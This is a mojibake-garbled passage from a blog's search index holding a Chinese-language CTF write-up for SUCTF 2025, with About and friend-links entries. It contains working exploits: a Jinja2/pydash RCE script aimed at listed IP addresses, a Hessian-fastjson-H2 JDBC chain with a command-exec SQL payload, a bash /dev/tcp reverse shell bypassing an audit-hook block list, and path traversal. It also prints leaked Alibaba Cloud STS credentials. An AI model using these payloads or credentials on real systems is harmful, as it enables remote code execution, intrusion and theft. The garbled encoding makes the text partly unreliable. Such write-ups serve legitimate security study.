content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not 